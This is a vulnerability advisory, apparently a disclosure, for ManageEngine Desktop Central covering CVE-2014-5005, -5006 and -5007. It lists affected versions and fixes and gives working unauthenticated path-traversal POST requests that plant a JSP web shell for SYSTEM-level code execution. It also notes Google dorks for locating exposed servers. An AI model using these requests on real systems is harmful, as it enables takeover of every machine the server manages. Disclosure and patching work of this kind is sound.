@@ -1,0 +1,57 @@
+Arbitrary file upload / remote code execution in ManageEngine Desktop Central / Desktop Central MSP
+Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+=================================================================================
+
+Background on the affected product:
+"Desktop Central is an integrated desktop & mobile device management
+software that helps in managing the servers, laptops, desktops,
+smartphones and tablets from a central point. It automates your
+regular desktop management routines like installing patches,
+distributing software, managing your IT Assets, managing software
+licenses, monitoring software usage statistics, managing USB device
+usage, taking control of remote desktops, and more."
+
+There are several vulnerable servers are out there if you know the
+Google dorks. Quoting the author of the Internet Census 2012: "As a
+rule of thumb, if you believe that "nobody would connect that to the
+Internet, really nobody", there are at least 1000 people who did."
+These vulnerabilities can be abused to achieve remote code execution
+as SYSTEM in Windows. I've updated the desktopcentral_file_upload
+Metasploit module to use the new statusUpdate technique. Needless to
+say, owning a Desktop Central box will give you control of all the
+computers and smartphones it manages.
+
+Technical details:
+#1
+Vulnerability: Remote code execution as SYSTEM via file upload (unauthenticated)
+Constraints: none; no authentication or any other information needed
+
+a)
+CVE-2014-5005
+Affected versions: all versions from v7 to v9 build 90054
+Fix: Upgrade to DC v9 build 90055
+POST /statusUpdate?actionToCall=LFU&customerId=1337&fileName=../../../../../../shell.jsp&configDataID=1
+<... your favourite jsp shell here ...>
+
+b)
+CVE-2014-5006
+Affected versions: all versions from v8 to v9 build 90054
+Fix: Upgrade to DC v9 build 90055
+POST /mdm/mdmLogUploader?filename=..\\..\\..\webapps\\DesktopCentral\\shell.jsp
+<... your favourite jsp shell here ...>
+
+
+#2
+CVE-2014-5007
+Vulnerability: Remote code execution as SYSTEM via file upload (unauthenticated)
+Constraints: no authentication needed; need to know valid
+computerName, domainName and customerId
+Affected versions: all versions from v7 to v9 build 90054
+Fix: Upgrade to DC v9 build 90055
+Notes: This was previously discovered as CVE-2013-7390 / OSVDB-10008
+by Thomas Hibbert, and was "fixed" in 2013-11-09. The fix is
+incomplete and it is still possible to upload a shell with a valid
+computerName, domainName and customerId.
+
+POST /agentLogUploader?computerName=whatever1&domainName=whatever2&customerId=1337&filename=..\\..\\..\\..\\webapps\\DesktopCentral\\shell.jsp
+<... your favourite jsp shell here ...>
